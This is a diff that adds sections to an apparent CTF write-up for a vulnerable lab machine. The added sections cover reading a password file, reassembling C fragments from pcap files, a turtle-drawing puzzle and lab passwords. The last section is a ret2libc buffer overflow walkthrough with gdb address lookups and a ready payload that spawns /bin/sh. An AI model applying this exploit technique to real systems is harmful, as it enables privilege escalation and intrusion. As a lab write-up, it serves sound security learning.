@@ -1,4 +1,120 @@
-#  Bomb Challenge Write-up
+## User 1: lmezard 🚩
+Finding the password for the user lmezard is straightforward.
+
+**1 The password is stored in a file named password within a directory called LOCKATME in the /home/ directory.**
+
+**2 You can display the contents of this file using the cat command:**
+
+```Bash
+cat /home/LOCKATME/password
+```
+
+**3 Executing this command will reveal the password for lmezard:**
+
+```bash
+lmezard:G!@M6f4Eatau{sF"
+```
+
+# Challenge Instructions for User `laurie`
+
+The home directory of user `lmezard` contains two important files: `README` and `fun`.
+
+## 🎯 Objective
+
+Complete this little challenge and use the result as the password for user `laurie` to log in via SSH.
+
+## 📁 Step-by-Step Instructions
+
+## 1. Inspect the `fun` File
+
+Run the `file` command to determine the file type:
+
+bash
+file fun
+# Output: fun: POSIX tar archive (GNU)
+## 2. Extract the Archive
+Extract the tar archive using:
+
+
+tar -xf fun
+This creates a directory named ft_fun containing multiple files with random names ending in .pcap.
+
+## 3. Analyze the Contents
+Each .pcap file contains a fragment of a C source code. A special comment in each file indicates the sequence:
+
+fileXX
+Where XX is a number that determines the order of the code fragment.
+
+## 4. Reconstruct the Original C Program
+Use the following Python script to:
+
+Read all .pcap files.
+
+Identify the order from the comment.
+
+Sort and merge them into one C file.
+
+```python
+import os
+import re
+
+folder_path = "ft_fun"
+output_file = "merged.c"
+file_parts = []
+
+for filename in os.listdir(folder_path):
+    file_path = os.path.join(folder_path, filename)
+    if os.path.isfile(file_path):
+        with open(file_path, 'r') as f:
+            content = f.read()
+            match = re.search(r'//\s*file\s*(\d+)', content, re.IGNORECASE)
+            if match:
+                file_number = int(match.group(1))
+                file_parts.append((file_number, content))
+            else:
+                print("Skipping file without index")
+
+file_parts.sort(key=lambda x: x[0])
+
+with open(os.path.join(folder_path, output_file), 'w') as out_file:
+    for _, content in file_parts:
+        out_file.write(content + '\n')
+
+print("C source file created as 'merged.c'")
+```
+
+
+## 5. Compile and Run the Program
+Compile the reconstructed C program:
+
+```bash
+gcc merged.c -o merged
+./merged
+```
+The program will output a string.
+
+## 6. Hash the Output
+Take the output string and hash it using SHA-256:
+
+```bash
+ echo -n "output_string" | sha256sum 
+```
+
+✅ Final Password
+Use the resulting hash as the password:
+
+```asm
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+🔐 Login via SSH
+Now, log in as user laurie using the obtained password:
+
+```bash
+ssh laurie@host
+```
+Replace `<host>` with the actual hostname or IP address.
+
+#  Laurie Challenge Write-up
 
 ## Introduction
 
@@ -541,4 +657,193 @@ The final `password` to connect to `thor` is:
 ```c
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
+
+# Thor's Turtle Drawing Challenge
+
+## Overview
+In the home directory of user `thor`, there's a file containing drawing instructions in French. The challenge involves interpreting these instructions, converting them into a Python turtle drawing, and deriving a password from the result.
+
+## Instructions File
+The file named `turtle` contains movement commands in French:
+
+```plaintext Avance 1 spaces
+Tourne droite de 1 degrees
+Avance 1 spaces
+Tourne droite de 1 degrees
+Avance 1 spaces
+Tourne droite de 1 degrees
+Avance 1 spaces
+Tourne droite de 1 degrees
+Avance 1 spaces
+Tourne droite de 1 degrees
+Avance 50 spaces
+
+Avance 100 spaces
+Recule 200 spaces
+Avance 100 spaces
+Tourne droite de 90 degrees
+Avance 100 spaces
+Tourne droite de 90 degrees
+Avance 100 spaces
+Recule 200 spaces
+```
+
+
+## Solution Approach
+
+## 1. **Recognize the Turtle Connection**: The file name and commands suggest using Python's `turtle` library which can interpret movement commands to draw shapes.
+
+2. **Conversion to Python Script**:
+   - A C program was created to convert the French instructions into a Python turtle script
+   - The converter handles these command translations:
+     - "Avance X spaces" → `turtle.forward(X)`
+     - "Recule X spaces" → `turtle.backward(X)`
+     - "Tourne droite de X degrees" → `turtle.right(X)`
+     - "Tourne gauche de X degrees" → `turtle.left(X)`
+
+## 3. **Conversion Program**:
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main() {
+    FILE *inputFile, *outputFile;
+    char line[100];
+
+    inputFile = fopen("turtle", "r");
+    if (inputFile == NULL) {
+        printf("Error opening input file!\n");
+        return 1;
+    }
+
+    outputFile = fopen("turtle_drawing.py", "w");
+    if (outputFile == NULL) {
+        printf("Error creating output file!\n");
+        fclose(inputFile);
+        return 1;
+    }
+
+    fprintf(outputFile, "import turtle\n\n");
+    fprintf(outputFile, "t = turtle.Turtle()\n");
+    fprintf(outputFile, "t.speed(1)  # Set drawing speed (1=slow, 10=fast)\n\n");
+
+    while (fgets(line, sizeof(line), inputFile)) {
+        int value;
+        char command[50];
+
+        if (sscanf(line, "Avance %d spaces", &value) == 1) {
+            fprintf(outputFile, "t.forward(%d)\n", value);
+        }
+        else if (sscanf(line, "Recule %d spaces", &value) == 1) {
+            fprintf(outputFile, "t.backward(%d)\n", value);
+        }
+        else if (sscanf(line, "Tourne droite de %d degrees", &value) == 1) {
+            fprintf(outputFile, "t.right(%d)\n", value);
+        }
+        else if (sscanf(line, "Tourne gauche de %d degrees", &value) == 1) {
+            fprintf(outputFile, "t.left(%d)\n", value);
+        }
+        else if (strcmp(line, "\n") == 0) {
+            fprintf(outputFile, "\n");
+        }
+    }
+
+    fprintf(outputFile, "\nturtle.done()  # Keep window open\n");
+
+    fclose(inputFile);
+    fclose(outputFile);
+
+    printf("Python script 'turtle_drawing.py' generated successfully!\n");
+    return 0;
+}
+```
+
+Execution Steps:
+
+**Compile and run the C program to generate turtle_drawing.py**
+
+**Execute the Python script: python3 turtle_drawing.py**
+
+**The turtle will draw the word "SLASH"**
+
+**Create an MD5 hash of "SLASH":**
+<pre>echo -n "SLASH" | md5sum </pre>
+
+Final Password
+
+The MD5 hash of "SLASH" is:
+<pre>
+646da671ca01bb5d84dbb5fb2238dc8e
+</pre>
+
+
+# ZAZ User
+## Binary Exploitation Writeup
+Target Binary
+We are working with a vulnerable binary named exploit_me. The goal is to gain shell access by exploiting a buffer overflow vulnerability and executing the system("/bin/sh") call.
+
+Step 1: Finding the Offset
+We first need to determine the offset at which the return address is overwritten. This is done using GDB:
+
+```bash
+gdb ./exploit_me
+``` 
+
+Inside GDB, we run the binary with a known pattern of characters:
+
+```bash
+run $(python -c 'print("A"*144)')
+```
+After observing where the program crashes, we identify the correct offset. In this case:
+
+```bash
+Offset = 140
+```
+
+Step 2: Gathering Useful Addresses
+We set a breakpoint at the main function to analyze the binary and find the necessary addresses for exploitation:
+
+```bash
+b main
+run
+```
+
+Getting the system() address:
+```bash
+p system
+$1 = 0xb7e6b060
+```
+Finding the address of /bin/sh in memory:
+```bash
+find &system,+9999999, "/bin/sh"
+0xb7f8cc58
+```
+Getting the exit() address (optional, for clean exit after shell):
+```bash
+p exit
+$2 = 0xb7e5ebe0
+```
+Step 3: Crafting the Exploit
+We now construct the payload with the following:
+
+- Offset: 140 bytes of padding ("A" * 140)
+
+- Return Address: Address of system() function
+
+- Next 4 Bytes: Return address for system() (can be dummy, or use exit())
+
+- Argument: Address of the /bin/sh string
+
+```bash
+./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7")'`
+```
+- \x60\xb0\xe6\xb7 → system address: 0xb7e6b060
+
+- "AAAA" → placeholder for the return address (can also be exit)
+
+- \x58\xcc\xf8\xb7 → "/bin/sh" address: 0xb7f8cc58
+
+Result
+Running the above command should spawn a shell, confirming successful exploitation.
 
